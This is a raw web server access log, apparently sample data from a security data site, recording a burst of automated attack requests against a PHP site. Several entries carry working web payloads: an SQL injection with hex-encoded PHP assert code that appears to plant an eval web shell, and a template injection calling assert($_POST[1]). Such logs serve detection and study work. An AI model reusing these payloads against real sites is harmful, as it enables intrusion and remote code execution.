104.222.43.241 - - [12/Jun/2023:04:55:11 -0700] "HEAD / HTTP/1.1" 200 396 "-" "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
104.222.43.241 - - [12/Jun/2023:04:55:11 -0700] "GET / HTTP/1.1" 200 49110 "-" "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
223.247.155.185 - - [12/Jun/2023:04:59:40 -0700] "GET /adadaddadad HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
43.154.103.197 - - [12/Jun/2023:05:03:29 -0700] "GET /user.php?act=login HTTP/1.1" 404 328 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:29 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:29 -0700] "GET /d.php HTTP/1.1" 404 305 "http://www.secrepo.com/d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:29 -0700] "POST /plus/moon.php HTTP/1.1" 418 746 "http://www.secrepo.com/plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:30 -0700] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 418 746 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:30 -0700] "GET /type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 418 746 "http://www.secrepo.com/type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:30 -0700] "GET /data/cache_template/rss.tpl.php HTTP/1.1" 404 305 "http://www.secrepo.com/data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
